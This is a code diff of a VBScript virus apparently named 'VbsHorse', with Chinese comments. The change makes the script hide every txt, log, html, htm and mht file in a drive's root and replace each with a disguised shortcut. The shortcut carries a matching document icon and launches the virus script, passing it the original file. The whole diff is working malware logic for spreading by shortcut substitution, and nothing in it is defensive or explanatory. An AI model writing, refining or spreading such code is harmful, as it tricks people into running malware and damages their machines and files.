@@ -28,13 +28,12 @@ Sub LnkInfectDrive(drivePath) '为磁盘根目录下所有的txt, log, html文�
 	Set files = folder.Files
 	For Each file In files
 		fileSuffix = GetFileSuffix(file.Name)
-		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then
-			'Call HideFile(file.Path)
+		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then '是否不是快捷方式文件，且文件名不是病毒名
 			lnkPath = drivePath & file.Name & ".lnk"
-			targetPath = drivePath & VbsHorseVirusName
-			args = file.Path
-			If objFileSystem.FileExists(lnkPath) = False Then
-				Call CreateShortcut(lnkPath, targetPath, args)
+			If objFileSystem.FileExists(lnkPath) = False Then '如果不存在文件
+				targetPath = drivePath & VbsHorseVirusName
+				args = file.Path
+				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '创建对应的快捷方式并隐藏原文件
 			End If
 		End If
 	Next
@@ -47,7 +46,19 @@ Function GetFileSuffix(fileName)
 	Set splitFileNameArray = Nothing
 End Function
 
-Sub CreateShortcut(lnkPath, targetPath, args) '创建对应的快捷方式
+Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '创建对应的快捷方式并隐藏原文件
+	originFileSuffix = GetFileSuffix(originFilePath)
+	Select Case originFileSuffix '检查是否是txt, log, html, htm, mht类型的文件
+	Case "txt", "log" '文本
+		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
+	Case "html", "htm", "mht" '网页
+		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
+	Case Else
+		Exit Sub
+	End Select
+	
+	Call HideFile(originFilePath) '隐藏原文件
+	
 	Dim objShell, shortcut
 	Set objShell = CreateObject("WScript.Shell")
 	Set shortcut = objShell.CreateShortcut(lnkPath)
@@ -55,22 +66,11 @@ Sub CreateShortcut(lnkPath, targetPath, args) '创建对应的快捷方式
 		.TargetPath = targetPath
 		.Arguments = args
 		.WindowStyle = 4
+		.IconLocation = iconPath
 		.Save
 	End With
 	Set objShell = Nothing
 	Set shortcut = Nothing
-End Sub
-
-Sub InfectFiles()
-	fileSuffixArray = Array("txt", "html", "log")
-	Call InfectFileWithSuffix(fileSuffixArray)
-	Set fileSuffixArray = Nothing
-End Sub
-
-Sub InfectFileWithSuffix(suffixArray)
-	For Each suffix In suffixArray
-		
-	Next
 End Sub
 
 Sub HideFile(filePath)
